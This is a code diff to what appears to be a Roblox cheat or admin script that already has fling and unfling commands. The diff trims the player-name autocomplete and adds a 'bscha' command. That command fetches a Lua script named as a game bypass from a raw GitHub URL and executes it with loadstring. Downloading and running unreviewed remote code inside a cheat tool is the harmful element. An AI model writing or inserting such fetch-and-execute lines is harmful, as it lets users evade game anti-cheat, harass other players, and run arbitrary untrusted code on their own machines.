@@ -55,6 +55,7 @@ local validcmds = {
 	fling = true,
 	unfling = true,
 	reload = true,
+	bscha = true
 }
 
 local aliases = {
@@ -205,23 +206,11 @@ local function updateAutocomplete()
 			bestPlayerMatch = "random"
 			bestPlayerScore = 1.0
 		else
-			-- FIRST check for names that START WITH the search string
 			for _, player in pairs(Players:GetPlayers()) do
 				if player.Name:lower():sub(1, #args) == args:lower() then
 					bestPlayerMatch = player.Name
 					bestPlayerScore = 1.0
 					break
-				end
-			end
-
-			-- If no exact start match found, then look for CONTAINS matches
-			if not bestPlayerMatch then
-				for _, player in pairs(Players:GetPlayers()) do
-					if player.Name:lower():find(args:lower(), 1, true) then
-						bestPlayerMatch = player.Name
-						bestPlayerScore = 0.9  -- Lower score than start matches
-						break
-					end
 				end
 			end
 		end
@@ -631,6 +620,10 @@ local function processCommand(fullInput)
 			originalPosition = nil
 			processCommand("clip") -- Ensure clipping is restored
 			return "Stopped flinging"
+		end,
+		bscha = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/xxfoxplayzzxx/xxfoxplayzzsscripts/refs/heads/main/bypassforgameidk.Lua"))()
+			return
 		end
 	}
 
